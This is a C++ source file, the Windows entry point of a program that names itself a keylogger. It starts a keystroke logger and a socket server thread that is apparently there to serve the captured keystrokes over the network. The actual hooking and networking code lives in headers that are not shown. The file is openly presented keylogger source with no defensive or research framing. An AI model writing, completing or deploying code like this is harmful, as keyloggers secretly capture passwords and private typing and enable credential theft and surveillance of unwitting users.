// Keylogger.cpp : Defines the entry point for the console application.
//


#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif // !_WINSOCKAPI_
#define WIN32_LEAN_AND_MEAN
#ifndef WIN32_LEAN_AND_MEAN
#endif // !WIN32_LEAN_AND_MEAN
#include "stdafx.h"
#include <string>
#include <cstdlib>
#include <memory>		
#include <io.h>
#include <fcntl.h>
#include <thread>
#include <tchar.h>
#include <windows.h>
#include <stdio.h>

#include "Keylogger.h"
#include "SocketServer.h"

extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }

shared_ptr<Keylogger> logger;
shared_ptr<SocketServer> socketServer;

LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
	WPARAM wParam, LPARAM lParam);
void socketThreadProc();

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, INT iCmdShow) {

	// Add console for debug
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);

	MSG msg;
	WNDCLASS wndClass;
	wndClass.lpfnWndProc = WndProc;
	wndClass.cbClsExtra = 0;
	wndClass.cbWndExtra = 0;
	wndClass.hInstance = hInstance;
	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndClass.hbrBackground = NULL;
	wndClass.lpszMenuName = NULL;
	wndClass.lpszClassName = L"window";
	RegisterClass(&wndClass);

	logger = make_shared<Keylogger>();
	logger->start();

	socketServer = make_shared<SocketServer>(logger.get());
	std::thread socketThread(socketThreadProc);
	while (GetMessage(&msg, NULL, 0, 0)) {
		DispatchMessage(&msg);
	}

	socketThread.join();
	return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
	WPARAM wParam, LPARAM lParam) {
	switch (message) {
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	case WM_QUIT:
	case WM_CLOSE:
		logger->stop();
		return 0;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
}

void socketThreadProc() {
	socketServer->start();
}